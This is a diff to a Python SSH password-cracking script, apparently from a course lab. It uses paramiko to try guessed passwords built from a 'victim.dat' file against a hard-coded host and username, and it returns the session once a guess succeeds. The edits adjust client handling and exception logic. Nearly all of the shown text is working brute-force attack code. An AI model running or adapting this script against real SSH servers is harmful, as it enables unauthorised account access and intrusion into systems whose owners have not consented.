@@ -5,9 +5,6 @@ import time
 # https://stackoverflow.com/questions/25609153/paramiko-error-reading-ssh-protocol-banner
 # above bug I don't know how to solve
 def crack_password():
-
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     
     # try all combimation of entries
     entries = [line.rstrip() for line in open('victim.dat', 'r')]
@@ -29,13 +26,11 @@ def crack_password():
                     client = paramiko.SSHClient()
                     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 try:
+                    # can Adjust parameter auth_timeout to achieve it
                     client.connect('192.168.99.213', username='csc2021', password=try_password, banner_timeout=500)
                 except paramiko.ssh_exception.AuthenticationException:
                     print("bad password ", try_password, "length ", len(try_password))
-                    continue
-                except:
-                    print("other exception")
-                    time.sleep(10)
+                    client.close()
                     continue
                 print("pass ",try_password)
                 return client
